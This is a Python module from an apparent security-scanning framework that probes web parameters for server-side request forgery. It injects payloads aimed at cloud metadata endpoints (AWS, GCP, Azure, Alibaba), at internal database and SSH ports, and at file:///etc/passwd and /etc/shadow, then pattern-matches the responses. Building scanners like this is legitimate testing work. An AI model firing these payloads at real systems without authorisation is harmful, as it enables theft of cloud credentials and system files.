#!/usr/bin/env python3
"""
NEXUS-STRIKE — webapp.ssrf
Domain: webapp
SSRF (Server-Side Request Forgery) detection with cloud metadata and internal service testing.
"""
from __future__ import annotations

import re
import socket
import ssl
import urllib.request
import urllib.parse
from typing import Any

from nexus.foundation.schema import (
    Finding,
    STATUS_COMPLETED,
    STATUS_FAILED,
    STATUS_NO_FINDINGS,
    tool_result,
)
from nexus.tools.registry import tool_registry

USER_AGENT = "NEXUS-STRIKE/0.2.0 (SSRF Detector)"

SSRF_TEST_URLS = [
    ("http://127.0.0.1:80", "Internal localhost HTTP"),
    ("http://127.0.0.1:8080", "Internal localhost:8080 HTTP"),
    ("http://localhost:80", "Internal localhost via hostname"),
    ("http://169.254.169.254/latest/meta-data/", "AWS EC2 metadata"),
    ("http://metadata.google.internal/", "GCP metadata"),
    ("http://100.100.100.200/latest/meta-data/", "Alibaba metadata"),
    ("http://169.254.169.254/computeMetadata/v1/", "GCP compute metadata"),
    ("http://metadata.azure.internal/", "Azure metadata"),
    ("http://0.0.0.0:80", "All interfaces"),
    ("http://127.0.0.1:22", "Internal SSH port"),
    ("http://127.0.0.1:3306", "Internal MySQL port"),
    ("http://127.0.0.1:6379", "Internal Redis port"),
    ("http://127.0.0.1:5432", "Internal PostgreSQL port"),
    ("file:///etc/passwd", "File protocol"),
    ("file:///etc/shadow", "File protocol shadow"),
]

SSRF_CLOUD_SIGNS = {
    "aws": ["ami-id", "instance-id", "instance-type", "security-groups", "public-hostname", "local-hostname", "meta-data/"],
    "gcp": ["project-id", "project-number", "instance-name", "computeMetadata"],
    "azure": ["vmId", "vmId", "location", "resourceId", "subscriptionId"],
    "alibaba": ["image_id", "instance_id", "zone_id", "instance_type"],
}

SSRF_INTERNAL_SIGNS = [
    r"root:.*?:0:0:",
    r"daemon:.*?:1:1:",
    r"ssh-\[",
    r"mysql|postgresql|redis|mongodb",
]


def _http_request(url: str, timeout: int = 5) -> dict:
    """Make HTTP request."""
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read(8192).decode("utf-8", errors="replace")
        return {"status": resp.status, "body": body, "error": None}
    except urllib.error.HTTPError as e:
        body = e.read(8192).decode("utf-8", errors="replace") if e.fp else ""
        return {"status": e.code, "body": body, "error": None}
    except Exception as e:
        return {"status": 0, "body": "", "error": str(e)[:100]}


def run(
    target: str,
    max_params: int = 10,
    timeout: int = 5,
    **kwargs: Any,
) -> dict:
    """Perform SSRF testing against target.

    Parameters
    ----------
    target : str
        Target URL to test.
    max_params : int
        Maximum parameters to test.
    timeout : int
        Request timeout in seconds.
    """
    if not target or not target.strip():
        return tool_result("webapp.ssrf", target, status=STATUS_FAILED, error="Empty target")

    url = target if "://" in target else f"http://{target}"
    findings: list[Finding] = []
    tested_params: list[str] = []
    vulns: list[dict] = []

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        params = {"url": "test", "fetch": "test", "load": "test", "redirect": "test", "src": "test", "uri": "test"}

    tested_params = list(params.keys())[:max_params]

    for param in tested_params:
        for test_url, desc in SSRF_TEST_URLS:
            query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
            query[param] = test_url
            inject_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(query)))
            resp = _http_request(inject_url, timeout)

            if resp["status"] and resp["status"] != 0:
                # Check for cloud metadata
                for cloud, signs in SSRF_CLOUD_SIGNS.items():
                    for sign in signs:
                        if sign in resp["body"]:
                            vulns.append({"param": param, "type": "cloud", "cloud": cloud, "url": test_url})
                            findings.append(Finding(
                                title=f"Cloud metadata SSRF via '{param}'",
                                severity="critical",
                                confidence="high",
                                affected_asset=url,
                                evidence=f"Cloud: {cloud.upper()}, Sign: {sign}, URL: {test_url}",
                                remediation="Block cloud metadata endpoints from server-side requests.",
                                tool="webapp.ssrf",
                                references=["CWE-918", "OWASP-A10"],
                            ))
                            break
                    if vulns:
                        break

                # Check for internal file read
                for pattern in SSRF_INTERNAL_SIGNS:
                    if re.search(pattern, resp["body"], re.IGNORECASE):
                        vulns.append({"param": param, "type": "file_read", "url": test_url})
                        findings.append(Finding(
                            title=f"File read SSRF via '{param}'",
                            severity="critical",
                            confidence="high",
                            affected_asset=url,
                            evidence=f"Pattern matched: {pattern[:30]}",
                            remediation="Disable file:// protocol and validate URLs.",
                            tool="webapp.ssrf",
                            references=["CWE-918", "OWASP-A10"],
                        ))
                        break

                # Check for open internal ports
                if resp["status"] < 400 and len(resp["body"]) > 0 and "file://" not in test_url.lower():
                    vulns.append({"param": param, "type": "internal", "url": test_url})
                    findings.append(Finding(
                        title=f"Internal service access via '{param}'",
                        severity="high",
                        confidence="medium",
                        affected_asset=url,
                        evidence=f"HTTP {resp['status']}, size: {len(resp['body'])} bytes",
                        remediation="Restrict internal network access from application.",
                        tool="webapp.ssrf",
                        references=["CWE-918", "OWASP-A10"],
                    ))

            if vulns:
                break

        if vulns:
            break

    summary = f"SSRF testing completed on {len(tested_params)} parameters"
    if vulns:
        summary += f" - {len(vulns)} vulnerabilities found"

    return tool_result(
        "webapp.ssrf", target,
        status=STATUS_COMPLETED if vulns else STATUS_NO_FINDINGS,
        findings=findings,
        summary=summary,
        metadata={"vulnerabilities": vulns, "tested_params": tested_params},
    )


tool_registry.register("webapp.ssrf", run, metadata={
    "name": "webapp.ssrf",
    "domain": "webapp",
    "status": "completed",
    "description": "SSRF detection with cloud metadata and internal service testing",
    "parameters": {
        "target": "Target URL to test",
        "max_params": "Maximum parameters to test (default: 10)",
        "timeout": "Request timeout in seconds (default: 5)",
    },
})